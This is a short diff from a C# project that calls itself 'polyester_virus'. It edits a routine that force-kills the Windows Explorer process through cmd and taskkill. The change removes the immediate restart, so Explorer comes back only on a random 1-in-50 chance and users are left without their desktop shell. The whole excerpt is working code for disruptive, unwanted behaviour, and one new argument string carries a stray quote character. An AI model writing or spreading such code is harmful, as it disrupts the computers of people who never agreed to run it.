@@ -58,7 +58,17 @@ namespace polyester_virus
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = "cmd",
-                        Arguments = "/c \"taskkill /im explorer.exe /f && start explorer.exe\"",
+                        Arguments = "/c \"taskkill /im explorer.exe /f\"",
+                        CreateNoWindow = false,
+                        UseShellExecute = false
+                    });
+                }
+                if (Random.Shared.Next(50) == 1)
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "cmd",
+                        Arguments = "/c start explorer.exe\"",
                         CreateNoWindow = false,
                         UseShellExecute = false
                     });
